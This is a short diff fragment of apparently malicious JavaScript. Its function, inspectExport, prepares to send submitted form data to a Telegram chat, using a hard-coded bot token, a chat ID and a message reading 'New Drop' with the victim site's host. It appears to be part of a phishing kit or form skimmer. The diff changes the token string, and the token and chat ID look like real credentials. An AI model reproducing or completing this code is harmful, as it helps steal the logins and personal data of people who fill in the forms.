@@ -48,7 +48,7 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiToken = "6949871622:AAE_u4ho8WwKtWDWc11J7y_p4Cd7gcf6J3I";
+    let apiToken = "6949871622:AAE_u4hoWwKtWDWc11J7y_p4Cdgcf6J3I";
     let chatId = "7157725704";
     let message = `New Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
 
